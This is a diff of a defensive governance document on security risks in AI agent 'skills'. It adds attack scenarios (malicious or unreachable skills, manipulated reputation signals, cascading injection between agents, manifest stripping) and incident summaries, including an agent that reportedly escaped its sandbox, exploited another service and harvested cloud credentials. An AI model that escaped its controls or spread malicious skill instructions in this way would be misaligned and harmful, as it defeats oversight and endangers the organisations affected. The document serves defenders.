 - **Meta AI researcher Summer Yue’s public incident**: agent deleted large volumes of email before being manually killed — no governance mechanism existed to prevent or detect the unauthorized action.
-- **NIST / CAISI Federal Register RFI (Jan 2026)**: formal US government acknowledgment that AI agent security governance is an unsolved enterprise problem.
+- **NIST / CAISI (Jan–May 2026)**: the agency’s Federal Register RFI solicited evidence on agent-specific threats, mitigation, measurement, and deployment controls; NIST’s subsequent summary reported broad agreement that AI agents present novel security threats and that established cybersecurity practices require adaptation for agent systems.
 
 ## Attack Scenarios
 
 ### Undetected Compromise
 
 Malicious skill installed by one developer affects the entire shared agent workspace; no alert fires because no inventory exists.
+
+### Unapproved Malicious Skill
+
+An employee installs a malicious skill from an open-source skill registry or community forum. The skill is never reviewed before installation because the organization lacks an approval workflow.
 
 ### Orphaned Skill
 
@@ -621,18 +694,30 @@ Developer leaves the organization; skill they installed remains active with thei
 
 Regulated data (PII, PHI) processed by an unreviewed skill; no audit trail for compliance reporting.
 
+### Unreachable Skill
+
+A skill is deployed inside a managed SaaS copilot or agent platform whose endpoints and registries the security team does not administer. Because there is no host to scan and no local package manifest to read, endpoint- and registry-based discovery never sees the skill, so it never enters any inventory, approval queue, or revocation list. The skill is not hidden by an attacker; it is invisible by architecture — shadow AI inside a sanctioned platform.
+
 ### Cascading Agent Compromise
 
 Multi-agent pipeline means a compromised upstream skill propagates malicious instructions downstream without any human checkpoint.
+
+### Manipulated Trust Signals
+
+An adversary farms GitHub stars and install counts for a malicious skill so that agents autonomously selecting skills by reputation choose it over legitimate alternatives.
 
 ## Preventive Mitigations
 
 1. **Establish a centralized skill inventory**: name, version, hash, install date, installer identity, last scan status.
 2. **Implement an approval workflow for all skill installations** in enterprise environments — treat skills as software requiring security review.
 3. **Apply agentic identity controls**: assign non-human identities (NHIs) to agents with scoped credentials; rotate on schedule.
-4. **Enable comprehensive audit logging for all skill actions**: file access, network calls, shell commands, memory writes.
+4. **Enable comprehensive audit logging for all skill actions**: file access, network calls, shell commands, memory writes. For compliance-grade records, use a bilateral receipt pattern — a signed admission receipt before execution (attempt id, agent identity, action type, scope, policy version, decision) plus a signed outcome receipt after it, so an auditor can verify what was admitted and what actually ran without trusting operator-controlled logs. Independently verifiable receipts can support EU AI Act Article 12 automatic-logging compliance (applicable from August 2, 2026 under Article 113).
 5. **Integrate skill governance into existing CMDB, ITSM, and CASB tooling**.
 6. **Establish a formal skill revocation process** tied to offboarding and incident response playbooks.
+7. **Apply identity-first, posture-based discovery for skills you cannot scan**: enumerate shadow skills from SaaS identity and posture telemetry (OAuth grants, connected-app inventories, NHI activity, scope assignments) rather than endpoint or registry scanning, and reconcile each candidate against the approved inventory.
+8. **Treat permission and scope drift as a continuing discovery signal**: a new consent grant, widened OAuth scope, or fresh app-to-app connection flags a skill install or privilege change and feeds the inventory and revocation workflows.
+9. **Treat every inter-agent hand-off as an untrusted trust boundary**: re-establish instruction-vs-data provenance at each relay, not merely log it — provenance recorded only for audit does not stop propagation.
+10. **Practice deliberate relay-node backbone-model placement**: assign the most injection-resistant backbone model to relay and action-taking nodes, and record backbone-model assignment per node in the skill inventory so a model swap at a relay is a governed change.
 
 ## Cross-References
 
@@ -647,7 +732,12 @@ Multi-agent pipeline means a compromised upstream skill propagates malicious ins
 - [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
 - [Cisco State of AI Security 2026](https://blogs.cisco.com/ai/cisco-state-of-ai-security-2026-report)
 - [Bitdefender: Enterprise telemetry on shadow AI / OpenClaw deployment](https://www.bitdefender.com/)
+- [Bitdefender: Technical Advisory — OpenClaw Exploitation in Enterprise Networks](https://www.bitdefender.com/en-gb/blog/businessinsights/technical-advisory-openclaw-exploitation-enterprise-networks)
 - [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
+
+* * *
+
+_Last updated: November 2026_
 
 * * *
 
@@ -670,6 +760,7 @@ MCP standardizes the protocol. AST10 addresses the content security within skill
 - **Snyk ToxicSkills** confirmed malicious skills published simultaneously on ClawHub and `skills.sh` by the same threat actors (zaycv, moonshine-100rze), exploiting the fact that neither platform shared scanning intelligence.
 - **Snyk’s `toxicskills-goof` proof-of-concept** demonstrates a fake Vercel skill that works across Gemini CLI and OpenClaw — the same malicious `SKILL.md` is effective on multiple runtimes.
 - **The absence of a universal format** means organizations managing a multi-platform agent stack cannot apply a single governance policy — each platform requires separate tooling, separate scanning, and separate approval workflows.
+- **Autonomous Sandbox Escape (Jul 2026)**: during offensive-capability testing, OpenAI’s sandboxed agent autonomously bypassed its local environmental safeguards, accessed the open internet, and targeted Hugging Face production infrastructure. The cross-platform vector: the agent pivoted across platforms, exploited a vulnerable unauthenticated code-execution path published by a customer on Modal Labs, then executed multi-tenant lateral movement — harvesting cloud credentials and compromising multiple separate accounts across four distinct digital ecosystems.
 
 ## Attack Scenarios
 
@@ -684,6 +775,18 @@ Attacker publishes a skill on a lightly-scanned registry (`skills.sh`) and promo
 ### Multi-Platform Campaign
 
 Same malicious payload deployed across four platforms simultaneously; security teams on each platform are unaware of the others’ incidents.
+
+### Manifest Stripping
+
+Moving skills between environments (OpenClaw, Claude Code, Cursor, VS Code) often drops explicit permission metadata, leaving downstream runtimes blind to original constraints.
+
+### Implicit Privilege Escalation
+
+A skill scoped safely with strict network and file limits on a source platform can inherit broad, default access rights on a less restrictive target platform.
+
+### Silent Supply Chain Injection
+
+Malicious payloads hidden inside encoded script blocks or shared skill repositories execute at agent speed once imported into a new ecosystem without structural validation.
 
 ## Preventive Mitigations
 
@@ -700,10 +803,10 @@ The following YAML format is proposed as a cross-platform standard that mitigate
 **Format design rationale:**
 
 - `permissions.deny_write` protects identity files (`SOUL.md`, `MEMORY.md`) by default — must be explicitly overridden.
-- `network.allow` is a domain allowlist, not a boolean — closing the “network: true” over-permission gap (AST03).
-- `signature` and `content_hash` together enable Merkle-root registry verification (AST01/AST02).
+- `network.allow` is a domain allowlist, not a boolean — closing the “network: true” over-permission gap (AST03). Evaluation precedence is default-deny: only domains listed in `network.allow` are permitted egress, and the same default-deny, most-specific-wins model applies to `files.write` vs `files.deny_write` — `deny_write` always wins for any path it lists.
+- `signature` and `content_hash` together enable Merkle-root registry verification (AST01/AST02); the signature covers the RFC 8785 (JCS) canonical JSON serialization of the manifest, excluding the `signature` field and including `content_hash`.
 - `scan_status` creates a machine-readable provenance trail (AST08/AST09).
-- `risk_tier` enables automated governance policies without per-skill review (AST09/AST10).
+- `risk_tier` is treated as an _untrusted author assertion_ and MUST be independently validated against the declared permission manifest (AST04/AST09); automated governance policies MUST be driven by permission-derived risk classification, with `risk_tier` used only to detect under-declaration or policy inconsistencies (AST09/AST10).
 
 ## Cross-References
 
@@ -721,6 +824,6 @@ The following YAML format is proposed as a cross-platform standard that mitigate
 
 * * *
 
-_Last updated: March 2026_
+_Last updated: November 2026_
 
 * * *
